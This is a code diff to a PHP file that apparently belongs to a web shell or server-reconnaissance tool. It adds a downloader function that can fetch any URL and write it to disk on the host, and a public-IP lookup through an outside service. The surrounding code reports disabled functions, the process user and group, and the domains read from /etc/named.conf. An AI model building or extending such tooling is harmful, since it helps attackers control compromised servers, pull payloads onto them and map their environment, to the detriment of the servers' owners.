@@ -196,16 +196,45 @@ function countDomains($f='/etc/named.conf'){
     return "$c Domain";
 }
 
+//Downloader
+function downloader($url, $dest = null) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        if ($dest === null) {
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data !== false ? $data : false;
+        }
+        $fp = fopen($dest, 'w');
+        if (!$fp) return false;
+        curl_setopt($ch, CURLOPT_FILE, $fp);
+        $res = curl_exec($ch);
+        curl_close($ch);
+        fclose($fp);
+        return $res !== false;
+    }
+    if ($dest !== null && ini_get('allow_url_fopen')) {
+        return @copy($url, $dest);
+    }
+    return ini_get('allow_url_fopen') ? @file_get_contents($url) : false;
+}
+
+//Get Ip Public Info
+function getPublicIP(){return ($ip=downloader('https://api.ipify.org'))?$ip:gethostbyname(gethostname());}
+
 //Server info
 function getServerInfo(){
     return [
-        'Server IP' => gethostbyname(gethostname()),
+        'Server IP' => getPublicIP(),
         'OS' => php_uname(),
         'PHP Version' => PHP_VERSION,
         'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI',
-        'Disabled Functions' => ($df = ini_get('disable_functions')) ? $d : '-',
+        'Disabled Functions' => ($d = ini_get('disable_functions')) ? $d : '-',
         'Loaded Extensions' => implode(', ', get_loaded_extensions()),
-        'My IP' => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '?',
+        'My IP' => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-',
         'User:Group' => get_current_user() . ':' . (function_exists('posix_getgrgid') && function_exists('posix_geteuid') ? posix_getgrgid(posix_geteuid())['name'] : '?'),
         'Domains' => countDomains()
     ];
